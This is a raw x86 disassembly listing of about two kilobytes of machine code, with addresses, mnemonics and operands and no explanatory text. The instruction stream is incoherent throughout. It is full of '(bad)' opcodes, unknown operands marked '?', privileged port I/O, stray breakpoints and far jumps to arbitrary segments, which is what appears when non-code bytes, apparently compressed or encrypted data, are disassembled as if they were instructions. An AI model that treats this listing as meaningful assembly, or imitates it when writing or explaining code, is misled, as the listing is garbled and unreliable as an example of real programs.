  41b3f3:	stos   BYTE PTR es:[edi],al
  41b3f4:	inc    edi
  41b3f5:	cld    
  41b3f6:	sahf   
  41b3f7:	mov    esi,0x63fbe1e8
  41b3fc:	sub    al,0xf7
  41b3fe:	xchg   DWORD PTR [ebx+edx*1+0x5f],esp
  41b402:	jmp    0x20f6:0x3602cc31
  41b409:	adc    al,0xdf
  41b40b:	pop    ebx
  41b40c:	aad    0x58
  41b40e:	(bad)  
  41b40f:	pop    eax
  41b410:	(bad)  
  41b411:	adc    al,0x84
  41b413:	outs   dx,DWORD PTR ds:[esi]
  41b414:	jae    0x41b414
  41b416:	imul   ebx,DWORD PTR [edi+0x1d],0x26
  41b41a:	ret    0x1f66
  41b41d:	add    eax,0x5c41d645
  41b422:	inc    edx
  41b423:	sub    al,0xf1
  41b425:	jmp    0x41b40c
  41b427:	mov    dl,ah
  41b429:	jo     0x41b43a
  41b42b:	ficomp DWORD PTR [ebx]
  41b42d:	mov    eax,ds:0x6ab6f1fb
  41b432:	pop    ds
  41b433:	adc    cl,BYTE PTR [esp+ebx*1+0x7a895d73]
  41b43a:	ror    DWORD PTR [edx-0x47],0xdf
  41b43e:	sbb    DWORD PTR [esi],ebp
  41b440:	ror    DWORD PTR [ebx],1
  41b442:	repz aad 0xd5
  41b445:	ret    
  41b446:	lahf   
  41b447:	rcl    BYTE PTR [edi+0x2bbe6462],0x2d
  41b44e:	daa    
  41b44f:	std    
  41b450:	jbe    0x41b499
  41b452:	popf   
  41b453:	mov    edi,0x6c15d117
  41b458:	mov    cl,0xd7
  41b45a:	das    
  41b45b:	fsub   DWORD PTR [edi]
  41b45d:	push   ebp
  41b45e:	repz (bad) [esi]
  41b461:	mov    bl,0xe
  41b463:	daa    
  41b464:	xchg   ecx,eax
  41b465:	xchg   edi,eax
  41b466:	out    dx,eax
  41b467:	push   ds
  41b468:	add    BYTE PTR es:[edx-0x4fae3291],ch
  41b46f:	push   ss
  41b470:	push   ebp
  41b471:	neg    bh
  41b473:	les    edi,FWORD PTR [eax-0x52]
  41b476:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b478:	das    
  41b479:	das    
  41b47a:	xlat   BYTE PTR ds:[ebx]
  41b47b:	xchg   ebp,eax
  41b47c:	(bad)  
  41b47d:	pop    eax
  41b47e:	inc    esp
  41b47f:	(bad)  
  41b480:	ins    DWORD PTR es:[edi],dx
  41b481:	test   al,0xbb
  41b483:	push   0x3a8c68f6
  41b488:	int    0x48
  41b48a:	dec    edx
  41b48b:	jl     0x41b467
  41b48d:	inc    esp
  41b48e:	mov    ebx,0xb7e825fa
  41b493:	push   esp
  41b494:	xchg   edx,eax
  41b495:	xor    eax,0x5e309d44
  41b49a:	xchg   ebp,eax
  41b49b:	push   esp
  41b49c:	iret   
  41b49d:	xchg   edi,eax
  41b49e:	pop    esp
  41b49f:	cs mov bl,0x59
  41b4a2:	jmp    0xfc1f:0xec45874f
  41b4a9:	fistp  DWORD PTR [ebx-0x9]
  41b4ac:	mov    ah,0x19
  41b4ae:	sahf   
  41b4af:	mov    ecx,0xd72e5fc2
  41b4b4:	repz retf 
  41b4b6:	pop    esp
  41b4b7:	adc    DWORD PTR [ebp+0x392bdb09],0x91b1969f
  41b4c1:	test   ah,0x66
  41b4c4:	imul   ecx,DWORD PTR [ecx],0xe68c7a77
  41b4ca:	inc    edx
  41b4cb:	(bad)  
  41b4cc:	jo     0x41b46e
  41b4ce:	cmp    dl,BYTE PTR [esi+0x2a]
  41b4d1:	push   ecx
  41b4d2:	cmp    eax,0xd8322d77
  41b4d7:	dec    ebx
  41b4d8:	push   0x6f8a1ac6
  41b4dd:	popa   
  41b4de:	sbb    ch,BYTE PTR [eax+esi*1+0x5a]
  41b4e2:	xor    bl,bl
  41b4e4:	cli    
  41b4e5:	lock lds edi,FWORD PTR [edx]
  41b4e8:	out    0xbc,eax
  41b4ea:	jae    0x41b4fe
  41b4ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4ed:	fsub   st(1),st
  41b4ef:	daa    
  41b4f0:	add    al,0x74
  41b4f2:	imul   edi,DWORD PTR [esi+0x54],0x464f481f
  41b4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4fa:	mov    ch,0x93
  41b4fc:	ds (bad) 
  41b4fe:	push   ebp
  41b4ff:	in     al,0xb4
  41b501:	nop
  41b502:	imul   ecx,DWORD PTR [edx+0x5b],0xffffffc1
  41b506:	pop    ds
  41b507:	test   BYTE PTR [ebx-0x7e],dh
  41b50a:	mov    ?,WORD PTR [esi+0x3268e619]
  41b510:	loope  0x41b587
  41b512:	and    BYTE PTR [ecx+0x29953b95],bh
  41b518:	mov    esp,0x93802e07
  41b51d:	(bad)  
  41b51e:	lods   eax,DWORD PTR ds:[esi]
  41b51f:	pop    esi
  41b520:	es retf 0x504
  41b524:	rol    BYTE PTR [ecx-0x3],cl
  41b527:	mov    edi,edx
  41b529:	sub    ebp,DWORD PTR [ebp+0x2e]
  41b52c:	inc    ecx
  41b52d:	add    ebp,esp
  41b52f:	jbe    0x41b4e6
  41b531:	sbb    DWORD PTR ds:0xa0f39ffc,0x9eec6e4f
  41b53b:	and    eax,DWORD PTR [edx-0x27351ebd]
  41b541:	aaa    
  41b542:	and    ecx,DWORD PTR [ecx]
  41b544:	icebp  
  41b545:	gs cmp eax,0x68ba1ca2
  41b54b:	pop    esi
  41b54c:	pushf  
  41b54d:	sbb    BYTE PTR [eax+esi*2],0x1b
  41b551:	mov    es,WORD PTR [edx]
  41b553:	xchg   edi,eax
  41b554:	mov    ds:0x70184e7e,al
  41b559:	pop    edx
  41b55a:	xchg   ebx,eax
  41b55b:	fistp  DWORD PTR [ecx+esi*4-0x4e]
  41b55f:	push   ecx
  41b560:	sub    DWORD PTR [ecx],eax
  41b562:	jge    0x41b52b
  41b564:	fld    DWORD PTR [edx-0x3c]
  41b567:	outs   dx,DWORD PTR ds:[esi]
  41b568:	jo     0x41b5d7
  41b56a:	mov    ah,0xb6
  41b56c:	mov    WORD PTR ds:0x4c3276c9,fs
  41b572:	scas   eax,DWORD PTR es:[edi]
  41b573:	push   ebx
  41b574:	lods   eax,DWORD PTR ds:[esi]
  41b575:	and    BYTE PTR [ecx-0x21],bl
  41b578:	retf   
  41b579:	dec    eax
  41b57a:	fdivr  st(0),st
  41b57c:	mov    ds:0xd9442733,eax
  41b581:	jmp    0x41b585
  41b583:	jmp    0xd090:0x9cee2f6d
  41b58a:	icebp  
  41b58b:	jge    0x41b567
  41b58d:	enter  0xc7b1,0x6
  41b591:	or     BYTE PTR [eax],ah
  41b593:	jp     0x41b602
  41b595:	lods   eax,DWORD PTR ds:[esi]
  41b596:	stos   BYTE PTR es:[edi],al
  41b597:	out    dx,al
  41b598:	mov    WORD PTR [edx],cs
  41b59a:	addr16 mov dh,0xc0
  41b59d:	cli    
  41b59e:	dec    edx
  41b59f:	aam    0x86
  41b5a1:	fdiv   DWORD PTR [edx-0x14]
  41b5a4:	out    dx,eax
  41b5a5:	push   esp
  41b5a6:	jmp    0x41b528
  41b5a8:	mov    esp,0x20fe1ddb
  41b5ad:	dec    edx
  41b5ae:	in     al,0xc7
  41b5b0:	dec    esi
  41b5b1:	arpl   WORD PTR [ecx],ax
  41b5b3:	sub    eax,0x76c046e2
  41b5b8:	sahf   
  41b5b9:	and    al,0xc0
  41b5bb:	jle    0x41b59d
  41b5bd:	test   DWORD PTR [edx],0xbb0fa7f8
  41b5c3:	icebp  
  41b5c4:	and    ch,BYTE PTR [esi+0x7333881f]
  41b5ca:	std    
  41b5cb:	arpl   WORD PTR [ebp+0x6a],di
  41b5ce:	mov    edi,0x1fda0875
  41b5d3:	mov    esp,0x53ffd3f1
  41b5d8:	push   ecx
  41b5d9:	dec    ebx
  41b5da:	xchg   edi,eax
  41b5db:	test   eax,0x763fb18a
  41b5e0:	add    DWORD PTR cs:0x301683b1,0x40db36d6
  41b5eb:	scas   al,BYTE PTR es:[edi]
  41b5ec:	scas   eax,DWORD PTR es:[edi]
  41b5ed:	shl    BYTE PTR [edx+0x1],cl
  41b5f0:	int3   
  41b5f1:	lods   eax,DWORD PTR ds:[esi]
  41b5f2:	fistp  QWORD PTR [ebp+0x7b]
  41b5f5:	sbb    dh,ch
  41b5f7:	jl     0x41b65e
  41b5f9:	js     0x41b58c
  41b5fb:	push   ss
  41b5fc:	loop   0x41b60f
  41b5fe:	int    0x3f
  41b600:	sub    dl,BYTE PTR [edx-0x7b85455f]
  41b606:	lods   al,BYTE PTR ds:[esi]
  41b607:	fwait
  41b608:	mov    cl,0xca
  41b60a:	icebp  
  41b60b:	test   BYTE PTR [ecx+0x67],dl
  41b60e:	adc    eax,0x8b0bd9a5
  41b613:	mov    edi,0x2d6825bb
  41b618:	stos   BYTE PTR es:[edi],al
  41b619:	mov    ah,0xa3
  41b61b:	loop   0x41b5f1
  41b61d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b61e:	jg     0x41b5c9
  41b620:	stos   BYTE PTR es:[edi],al
  41b621:	addr16 pop esp
  41b623:	mov    dh,0x3a
  41b625:	dec    esi
  41b626:	xchg   esp,eax
  41b627:	imul   BYTE PTR [eax+ecx*8]
  41b62a:	aas    
  41b62b:	aad    0x92
  41b62d:	and    DWORD PTR [esi+ecx*8],edi
  41b630:	jp     0x41b5e4
  41b632:	mov    ch,0x24
  41b634:	in     al,0x2e
  41b636:	jb     0x41b6b0
  41b638:	xor    BYTE PTR [ebx+0x4d],ah
  41b63b:	mov    bh,0x1d
  41b63d:	cmp    edi,ebp
  41b63f:	xor    eax,0xecf1eeed
  41b644:	fwait
  41b645:	and    DWORD PTR [edx-0x55a07e9d],ebp
  41b64b:	neg    BYTE PTR [ebx+ebx*1-0x290be42b]
  41b652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b653:	pop    ebx
  41b654:	data16 or al,0x2a
  41b657:	mov    dh,0xb8
  41b659:	add    eax,0xaec02131
  41b65e:	mov    ss,WORD PTR [edx-0x535f8d2c]
  41b664:	out    0x3d,al
  41b666:	aaa    
  41b667:	in     al,dx
  41b668:	xchg   edx,eax
  41b669:	and    DWORD PTR [esi+0x287b2dca],esp
  41b66f:	jmp    0x1325:0x7c22072c
  41b676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b677:	stos   BYTE PTR es:[edi],al
  41b678:	pop    ds
  41b679:	pop    ds
  41b67a:	clc    
  41b67b:	(bad)  
  41b67d:	div    BYTE PTR [ecx+0x486fe39c]
  41b683:	mov    edx,0xaf76a635
  41b688:	dec    ebp
  41b689:	lds    edx,FWORD PTR [ebp-0x2a960ac3]
  41b68f:	(bad)
  41b692:	mov    dh,0x59
  41b694:	loopne 0x41b63e
  41b696:	(bad)  [ecx+0x4810ecb6]
  41b69c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b69d:	std    
  41b69e:	pop    esp
  41b69f:	(bad)  
  41b6a0:	mov    edi,DWORD PTR [ebx]
  41b6a2:	ins    DWORD PTR es:[edi],dx
  41b6a3:	cmc    
  41b6a4:	shl    BYTE PTR [esi-0x353c7a1b],cl
  41b6aa:	cmp    BYTE PTR [ecx+edx*4-0x47ab3449],bl
  41b6b1:	mov    cl,0xab
  41b6b3:	mov    ch,0xb0
  41b6b5:	in     eax,0x8
  41b6b7:	out    0x3,al
  41b6b9:	ret    0x6b2e
  41b6bc:	cli    
  41b6bd:	dec    ebp
  41b6be:	adc    DWORD PTR [edi+0x71af3070],esp
  41b6c4:	jl     0x41b661
  41b6c6:	cmc    
  41b6c7:	(bad)  
  41b6c8:	xchg   esi,eax
  41b6c9:	mov    ah,0x3a
  41b6cb:	push   0x53b1523d
  41b6d0:	and    DWORD PTR [ecx],edi
  41b6d2:	mov    ds:0x253e2fc6,eax
  41b6d7:	dec    esi
  41b6d8:	jo     0x41b721
  41b6da:	ret    
  41b6db:	push   ecx
  41b6dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6dd:	fs and dh,bh
  41b6e0:	mov    esp,DWORD PTR [ecx-0x66651b26]
  41b6e6:	push   cs
  41b6e7:	dec    esp
  41b6e8:	adc    DWORD PTR [ecx+0x1fb03b07],esp
  41b6ee:	lods   eax,DWORD PTR ds:[esi]
  41b6ef:	lea    eax,[edi+0x35]
  41b6f2:	mov    ah,0xbe
  41b6f4:	(bad)  
  41b6f5:	fcom   DWORD PTR ds:0x2b5bb456
  41b6fb:	pop    edi
  41b6fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6fd:	popf   
  41b6fe:	out    0x8f,al
  41b700:	test   eax,0x2f7b7528
  41b705:	int3   
  41b706:	fdivr  DWORD PTR [edx]
  41b708:	mov    ebx,0x7edf224f
  41b70d:	fidiv  DWORD PTR [esi-0x4dac2bcd]
  41b713:	stos   BYTE PTR es:[edi],al
  41b714:	arpl   WORD PTR [edi-0x37],cx
  41b717:	and    esi,DWORD PTR [esp+ebx*1+0x3a]
  41b71b:	push   ebx
  41b71c:	lea    edi,[edx+0x1db94657]
  41b722:	xor    cl,BYTE PTR [edi]
  41b724:	imul   ebp,DWORD PTR [edx-0x67cc71ed],0x3d230d0
  41b72e:	jl     0x41b6d6
  41b730:	sbb    BYTE PTR [ebp+0x24],ch
  41b733:	outs   dx,BYTE PTR ds:[esi]
  41b734:	int    0x9d
  41b736:	dec    eax
  41b737:	pop    esi
  41b738:	dec    ebx
  41b739:	xchg   esi,eax
  41b73a:	stos   BYTE PTR es:[edi],al
  41b73b:	inc    eax
  41b73c:	je     0x41b74f
  41b73e:	dec    ebp
  41b73f:	add    DWORD PTR [esi-0x205c0e8e],esi
  41b745:	jbe    0x9b72614c
  41b74b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b74c:	mov    ds:0x968fabce,al
  41b751:	shl    DWORD PTR [ebx+0x295cfb9e],0x86
  41b758:	daa    
  41b759:	push   ss
  41b75a:	pop    ebx
  41b75b:	xor    al,0xcf
  41b75d:	add    eax,0xb31fb707
  41b762:	xlat   BYTE PTR ds:[ebx]
  41b763:	fist   DWORD PTR [esi-0x42]
  41b766:	jmp    0xfa8f8099
  41b76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b76c:	mov    BYTE PTR [ebx],bh
  41b76e:	dec    ebx
  41b76f:	xchg   DWORD PTR [ecx],eax
  41b771:	push   ecx
  41b772:	inc    esi
  41b773:	jne    0x41b779
  41b775:	(bad)  
  41b776:	sbb    eax,0x132a01eb
  41b77b:	fs inc esi
  41b77d:	mov    ds:0x8939de5b,al
  41b782:	scas   al,BYTE PTR es:[edi]
  41b783:	cld    
  41b784:	mov    ecx,0xfa65d377
  41b789:	xor    cl,dh
  41b78b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b78c:	daa    
  41b78d:	mov    cs,WORD PTR [eax-0x4d]
  41b790:	retf   
  41b791:	retf   0x6f61
  41b794:	cmp    al,0xeb
  41b796:	(bad)  
  41b797:	sti    
  41b798:	sbb    eax,0x52586131
  41b79d:	push   ebp
  41b79e:	dec    ebp
  41b7a0:	adc    dl,ah
  41b7a2:	pop    edx
  41b7a3:	add    edx,ebp
  41b7a5:	(bad)  
  41b7a6:	nop
  41b7a7:	inc    ebx
  41b7a8:	dec    edi
  41b7a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7ab:	cmp    bl,dl
  41b7ad:	les    ecx,FWORD PTR [edx-0x75]
  41b7b0:	ja     0x41b7fa
  41b7b2:	das    
  41b7b3:	iret   
  41b7b4:	adc    al,0xdb
  41b7b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7b7:	dec    ebp
  41b7b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b9:	(bad)
  41b7bc:	push   edx
  41b7bd:	xor    al,0x95
  41b7bf:	xchg   DWORD PTR [ebp+0x2634b2ac],esp
  41b7c5:	outs   dx,DWORD PTR ds:[esi]
  41b7c6:	pop    ebp
  41b7c7:	in     al,0xb4
  41b7c9:	mov    edx,0x80eb6271
  41b7ce:	pop    esi
  41b7cf:	test   BYTE PTR [eax],bl
  41b7d1:	into   
  41b7d2:	pop    ebx
  41b7d3:	aam    0xec
  41b7d5:	in     al,0xc0
  41b7d7:	out    dx,al
  41b7d8:	ss popa 
  41b7da:	mov    ebp,?
  41b7dc:	pop    eax
  41b7dd:	jb     0x41b7a8
  41b7df:	pop    edx
  41b7e0:	mov    esi,0xb429e471
  41b7e5:	mov    cl,0xd
  41b7e7:	rcl    dh,0x8c
  41b7ea:	inc    ecx
  41b7eb:	cwde   
  41b7ec:	sbb    al,0xda
  41b7ee:	ss cmp al,0xb4
  41b7f1:	jp     0x41b7b4
  41b7f3:	pop    es
  41b7f4:	pop    ds
  41b7f5:	cmp    eax,0x6e3a5c8d
  41b7fa:	fidivr WORD PTR [edi-0x3e288855]
  41b800:	shl    esi,cl
  41b802:	sbb    edx,0xd11f440e
  41b808:	test   ch,ah
  41b80a:	lods   al,BYTE PTR ds:[esi]
  41b80b:	ins    DWORD PTR es:[edi],dx
  41b80c:	repz push eax
  41b80e:	stos   BYTE PTR es:[edi],al
  41b80f:	pop    esi
  41b810:	cld    
  41b811:	shr    bh,0xc8
  41b814:	ret    
  41b815:	in     al,0x73
  41b817:	loope  0x41b7a3
  41b819:	retf   
  41b81a:	adc    esp,esi
  41b81c:	pop    ds
  41b81d:	and    BYTE PTR [eax+eax*2+0x3e],bl
  41b821:	inc    ecx
  41b822:	aam    0x5f
  41b824:	jecxz  0x41b827
  41b826:	arpl   WORD PTR [ecx+0x19708dbd],sp
  41b82c:	rcr    BYTE PTR [edx-0x4f],1
  41b82f:	jp     0x41b875
  41b831:	push   cs
  41b832:	and    ah,BYTE PTR [edi]
  41b834:	xor    ebx,eax
  41b836:	shl    DWORD PTR [edi+0x73846a29],0x7c
  41b83d:	lods   al,BYTE PTR ds:[esi]
  41b83e:	fwait
  41b83f:	cmp    dh,bl
  41b841:	rcl    esi,1
  41b843:	nop
  41b844:	adc    eax,0x92aa068
  41b849:	repz or DWORD PTR [ebx],ecx
  41b84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b84d:	mov    esi,0xfc0b91c5
  41b852:	or     eax,0x1bd0712
  41b857:	cmp    BYTE PTR [ebx-0x3fe9ebe2],0x3b
  41b85e:	shl    BYTE PTR [ecx-0x627aa12b],cl
  41b864:	jg     0x41b8b2
  41b866:	fwait
  41b867:	sti    
  41b868:	and    esp,esp
  41b86a:	aam    0xcb
  41b86c:	jge    0x41b842
  41b86e:	lahf   
  41b86f:	in     al,dx
  41b870:	(bad)  
  41b871:	jecxz  0x41b7fa
  41b873:	in     al,dx
  41b874:	int3   
  41b875:	addr16 ret 
  41b877:	jo     0x41b8d1
  41b879:	ins    BYTE PTR es:[edi],dx
  41b87a:	sub    esp,0x67ae203c
  41b880:	push   ds
  41b881:	ret    0x1f08
  41b884:	cli    
  41b885:	outs   dx,DWORD PTR ds:[esi]
  41b886:	jmp    0x37e7e665
  41b88b:	clc    
  41b88c:	aad    0x29
  41b88e:	js     0x41b8bb
  41b890:	dec    edi
  41b891:	push   es
  41b892:	push   0xb9b1d00c
  41b897:	push   ds
  41b898:	stos   DWORD PTR es:[edi],eax
  41b899:	aam    0xba
  41b89b:	rcr    al,1
  41b89d:	push   ds
  41b89e:	out    0x6e,eax
  41b8a0:	add    dh,bh
  41b8a2:	mov    esp,0xcfeb44f8
  41b8a7:	sub    ebp,eax
  41b8a9:	cmp    eax,0x4eed8679
  41b8ae:	push   0xffffff82
  41b8b0:	xor    eax,DWORD PTR [esi]
  41b8b2:	lahf   
  41b8b3:	xchg   ebp,eax
  41b8b4:	adc    DWORD PTR [ebx],ecx
  41b8b6:	stos   BYTE PTR es:[edi],al
  41b8b7:	imul   ecx,DWORD PTR [ecx+0x760ec803],0xcf6ddfab
  41b8c1:	xor    BYTE PTR [edi+ebx*4],al
  41b8c4:	or     al,0x8d
  41b8c6:	jp     0x41b8d0
  41b8c8:	jp     0x41b8a7
  41b8ca:	aaa    
  41b8cb:	dec    ecx
  41b8cc:	ss ins BYTE PTR es:[edi],dx
  41b8ce:	inc    ebp
  41b8cf:	mov    bl,0x94
  41b8d1:	clc    
  41b8d2:	sbb    BYTE PTR [ecx],0xb8
  41b8d5:	jl     0x41b8e6
  41b8d7:	call   0xe39b0a0c
  41b8dc:	sbb    esp,DWORD PTR [edi-0x27]
  41b8df:	sub    BYTE PTR [eax-0x4c480448],dl
  41b8e5:	test   eax,0x11c41e5c
  41b8ea:	out    0x19,eax
  41b8ec:	dec    esp
  41b8ed:	mov    bh,0xb0
  41b8ef:	cld    
  41b8f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8f1:	(bad)  [ebp+0x45]
  41b8f4:	mov    WORD PTR [esi+0x6acdeb77],fs
  41b8fa:	xchg   ebx,eax
  41b8fb:	data16 icebp 
  41b8fd:	in     al,dx
  41b8fe:	mov    esi,0x4e0a066c
  41b903:	mov    bl,0xec
  41b905:	jo     0x41b92d
  41b907:	push   edi
  41b908:	sbb    ch,BYTE PTR [edx+ebx*1]
  41b90b:	dec    esi
  41b90c:	sbb    al,0x23
  41b90e:	jno    0x41b987
  41b910:	pop    eax
  41b911:	dec    ebx
  41b912:	lea    ecx,[ebx+0xf]
  41b915:	mov    cl,0xc7
  41b917:	sti    
  41b918:	jl     0x41b91e
  41b91a:	jg     0x41b8d7
  41b91c:	push   ss
  41b91d:	cbw    
  41b91f:	mov    ah,0x7d
  41b921:	fcom   st(3)
  41b923:	add    bh,BYTE PTR [eax]
  41b925:	inc    esi
  41b926:	jmp    0x41b94e
  41b928:	std    
  41b929:	lahf   
  41b92a:	jmp    0x41b905
  41b92c:	mov    dl,0x1d
  41b92e:	retf   
  41b92f:	pop    ss
  41b930:	inc    ecx
  41b931:	sti    
  41b932:	dec    ecx
  41b933:	dec    ebx
  41b934:	data16 fidiv DWORD PTR [ebp+ebx*2-0xa]
  41b939:	xchg   ecx,eax
  41b93a:	xlat   BYTE PTR ds:[ebx]
  41b93b:	inc    ebx
  41b93c:	jae    0x41b8d1
  41b93e:	push   esi
  41b93f:	xchg   esi,eax
  41b940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b941:	xchg   ebx,eax
  41b942:	cdq    
  41b943:	test   DWORD PTR [ecx],ebx
  41b945:	jmp    0x57dc:0xe490acd
  41b94c:	addr16 pop ss
  41b94e:	push   esp
  41b94f:	push   ebp
  41b950:	add    al,0xc9
  41b952:	sub    DWORD PTR [edi],esi
  41b954:	add    ch,al
  41b956:	add    al,0x32
  41b958:	inc    edi
  41b959:	outs   dx,DWORD PTR ds:[esi]
  41b95a:	push   edi
  41b95b:	or     al,0x93
  41b95d:	and    ebp,esi
  41b95f:	pop    esi
  41b960:	imul   ebp,eax,0xe63dde
  41b966:	(bad)  
  41b967:	mov    al,ds:0x4f3fc376
  41b96c:	jno    0x41b984
  41b96e:	fldcw  WORD PTR [ebp-0x8]
  41b971:	cwde   
  41b972:	nop
  41b973:	inc    esi
  41b974:	push   eax
  41b975:	popa   
  41b976:	cli    
  41b977:	jp     0x41b936
  41b979:	add    ebx,esp
  41b97b:	dec    eax
  41b97c:	add    BYTE PTR [esi],dl
  41b97e:	lods   eax,DWORD PTR ds:[esi]
  41b97f:	mov    ebp,0x473f1e11
  41b984:	xchg   ebp,eax
  41b985:	cwde   
  41b986:	in     eax,0xc
  41b988:	out    0x32,al
  41b98a:	mov    ebp,esp
  41b98c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41b98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b98f:	loopne 0x41b963
  41b991:	ror    DWORD PTR [ebp-0x178df101],0x3f
  41b998:	iret   
  41b999:	aam    0x43
  41b99b:	jae    0x41ba18
  41b99d:	push   es
  41b99e:	add    BYTE PTR [ecx],dl
  41b9a0:	fucom  st(3)
  41b9a2:	inc    ebx
  41b9a3:	ja     0x41b951
  41b9a5:	fsub   DWORD PTR [ebx-0x4997a668]
  41b9ab:	push   ecx
  41b9ac:	mov    dh,0x6c
  41b9ae:	xchg   ebp,eax
  41b9af:	cmp    DWORD PTR [eax*8+0x9349458],edi
  41b9b6:	push   edi
  41b9b7:	xor    DWORD PTR [esi+0x7],0x7b7dbe20
  41b9be:	dec    edx
  41b9bf:	pop    esp
  41b9c0:	push   edi
  41b9c1:	pop    edi
  41b9c2:	inc    esp
  41b9c3:	add    eax,0x4eae4e11
  41b9c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9c9:	test   DWORD PTR [edx+0x136923fc],0xe5cdce30
  41b9d3:	mov    DWORD PTR [esi+eiz*2-0x21],ebx
  41b9d7:	scas   al,BYTE PTR es:[edi]
  41b9d8:	xor    BYTE PTR [ecx+edx*8],dh
  41b9db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9dc:	lods   eax,DWORD PTR ds:[esi]
  41b9dd:	test   BYTE PTR [ebx-0x37],0x79
  41b9e1:	aad    0xb0
  41b9e3:	dec    ecx
  41b9e4:	cld    
  41b9e5:	push   ds
  41b9e6:	call   0xe60c38f4
  41b9eb:	mov    ds:0xa31688bf,eax
  41b9f0:	mov    dl,0x87
  41b9f2:	sub    BYTE PTR [esi+ecx*2],bh
  41b9f5:	fisttp DWORD PTR [edi-0x4d]
  41b9f8:	iret   
  41b9f9:	xchg   ecx,eax
  41b9fa:	aad    0xff
  41b9fc:	push   ds
  41b9fd:	pop    edi
  41b9fe:	and    eax,0x1c0e9976
  41ba03:	or     bh,BYTE PTR [esp+ebp*4+0x3295f074]
  41ba0a:	(bad)  
  41ba0b:	icebp  
  41ba0c:	icebp  
  41ba0d:	test   al,0xd1
  41ba0f:	dec    eax
  41ba10:	push   0xce84b923
  41ba15:	rcl    eax,1
  41ba17:	pushf  
  41ba18:	push   eax
  41ba19:	into   
  41ba1a:	mov    ah,0x3e
  41ba1c:	xor    eax,0x7c53f859
  41ba21:	mov    DWORD PTR [eax],ebp
  41ba23:	mov    ds:0x62ddd5d2,al
  41ba28:	jbe    0x41ba74
  41ba2a:	xlat   BYTE PTR ds:[ebx]
  41ba2b:	mov    bl,0x68
  41ba2d:	xor    eax,0x90b84d46
  41ba32:	stos   DWORD PTR es:[edi],eax
  41ba33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba34:	push   es
  41ba35:	out    dx,eax
  41ba36:	inc    ebp
  41ba37:	fcom   QWORD PTR ds:0x327f7288
  41ba3d:	and    eax,0x71e8d5fc
  41ba43:	out    0x89,eax
  41ba45:	mov    cl,BYTE PTR [edx-0x28cae8d7]
  41ba4b:	xor    ch,BYTE PTR [ecx+0x774b7183]
  41ba51:	std    
  41ba52:	cmp    eax,0xe9212281
  41ba57:	xor    eax,0xef517322
  41ba5c:	push   0xffffffbe
  41ba5e:	push   eax
  41ba5f:	idiv   BYTE PTR ds:0xdbb32bff
  41ba65:	push   esp
  41ba66:	call   0x627c906e
  41ba6b:	or     dl,BYTE PTR [ebx-0x2f]
  41ba6e:	xor    al,BYTE PTR [edx+0x973cf28]
  41ba74:	repnz xchg esp,eax
  41ba76:	out    0xca,al
  41ba78:	loop   0x41ba46
  41ba7a:	mov    edx,0x799260e
  41ba7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba80:	pop    es
  41ba81:	jmp    0x324300aa
  41ba86:	xor    al,0x8e
  41ba88:	xchg   ebx,eax
  41ba89:	loope  0x41ba18
  41ba8b:	jbe    0x41ba39
  41ba8d:	jnp    0x41bac4
  41ba8f:	push   esi
  41ba90:	out    dx,eax
  41ba91:	pop    esp
  41ba92:	add    DWORD PTR [ecx-0x1fe3e741],ebp
  41ba98:	mov    ch,0xf6
  41ba9a:	or     al,0xa8
  41ba9c:	dec    eax
  41ba9d:	push   0x418d5256
  41baa2:	cmc    
  41baa3:	cmp    eax,0x8f84479a
  41baa8:	mov    ?,WORD PTR [ebx+0x3de68dd3]
  41baae:	xor    eax,0xdd6eacf6
  41bab3:	inc    edi
  41bab4:	push   0x881ddb1
  41bab9:	test   BYTE PTR [edi+0x7d],dl
  41babc:	cmp    al,0x7a
  41babe:	leave  
  41babf:	cli    
  41bac0:	lahf   
  41bac1:	mov    eax,ds:0x85bd126a
  41bac6:	or     ebx,DWORD PTR [ecx-0x4b914f3c]
  41bacc:	dec    esp
  41bacd:	and    al,BYTE PTR [ebp+0x6e2a10c]
  41bad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bad4:	test   eax,0xcf9a5779
  41bad9:	dec    ebx
  41bada:	call   0x50d1cc10
  41badf:	adc    esi,0xffffffb3
  41bae2:	sbb    edx,DWORD PTR [ecx]
  41bae4:	push   edx
  41bae5:	into   
  41bae6:	mov    WORD PTR [edx+0x50],ss
  41bae9:	aam    0xb7
  41baeb:	int3   
  41baec:	or     eax,0x64912614
  41baf1:	outs   dx,BYTE PTR ds:[esi]
  41baf2:	and    DWORD PTR [eax+0x7fa77703],0xffffffd9
  41baf9:	adc    al,0x6d
  41bafb:	ins    BYTE PTR es:[edi],dx
  41bafc:	fdiv   QWORD PTR [edi+0x7e]
  41baff:	mov    esp,0xf53c8c88
  41bb04:	jle    0x41ba86
  41bb06:	subps  xmm7,XMMWORD PTR [ebp-0x79]
  41bb0a:	inc    eax
  41bb0b:	rol    bh,0xa4
  41bb0e:	in     eax,0xd
  41bb10:	mov    eax,ds:0x35522feb
